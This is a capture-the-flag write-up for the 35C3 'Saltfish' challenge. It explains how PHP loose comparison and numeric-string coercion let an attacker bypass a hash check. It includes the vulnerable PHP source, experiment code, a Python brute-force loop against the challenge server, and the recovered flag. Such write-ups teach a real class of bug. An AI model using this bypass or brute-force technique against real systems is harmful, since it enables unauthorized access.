## Saltfish

> Solves: 105
> "I have been told that the best crackers in the world can do this under 60 minutes but unfortunately I need someone who can do this under 60 seconds." - Gabriel
> http://35.207.132.47:86

## Analysis

Page displays its source code:

```php
<?php
  require_once('flag.php');
  if ($_ = @$_GET['pass']) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (md5($_) + $_[0] == md5($ua)) {
      if ($_[0] == md5($_[0] . $flag)[0]) {
        echo $flag;
      }
    }
  } else {
    highlight_file(__FILE__);
  }
```

Alright so this is quite weird code, it checks whether SUM of md5 of supplied password and first character of password is equal to the md5 of user agent.
If that is true it checks whether first character of password is equal to first character of md5 hash of concatenated first character and flag.

However what is important to note here is that all comparisons are (loose)[http://php.net/manual/en/types.comparisons.php].

## Solution


The way I solved this challenge included making my own PHP code and seeing what will it evaluate to.

First matter of interest is how will ```md5($_)+$_[0]``` be evaluated.

Experiment code:
```php
<?php

$a=md5("A");
echo $a;
echo $a+"3";
```
Output:
```
7fc56270e7a70fa81a5935b72eacbe29<br />
<b>Notice</b>:  A non well formed numeric value encountered in <b>[...][...]</b> on line <b>5</b><br />
10
```

It takes hash up to first non-digit and adds it with 3, if we added it with nondigit (e.g $a+"b") it would be like adding with 0.
Also if hash started with character rather than digit and we added it with non digit result would be 0.
In sum: "a"+"b"=0 "a"+"3"=3 "7"+"3"=10


Secondly evaluation needs to be equal to md5 of our user agent, loose comparison table linked earlier shows that 0 is equal to string in loose comparison so we should aim for evaluation to be equal to 0 (however this is not true if string starts with digit)

Finally in third check we find out possible characters for first letter of pass parameter ```md5($_[0] . $flag)[0]``` can only be 0-9 or a-f.

So to sum up conditions:
1) hash of pass plus it's first character need to evaluate to 0
2) Hash of user agent must not start with digit
3) First letter of pass must be 0-9 or a-f

I set user agent to "ASD" (to be honest I didn't think about second condition when I solved challenge, I just got lucky) which has hash not starting with digit.
Then I made simple python script:
```python
import requests
url="http://35.207.132.47:86/?pass="
a=0
first="b"
while 1:
	print requests.get(url+first+str(a),headers={"User-Agent":"ASD"}).text
	print a
	a+=1
```

I changed first variable till scrupt spat out the flag, it worked with "b0" as a pass parameter!

35c3_password_saltf1sh_30_seconds_max

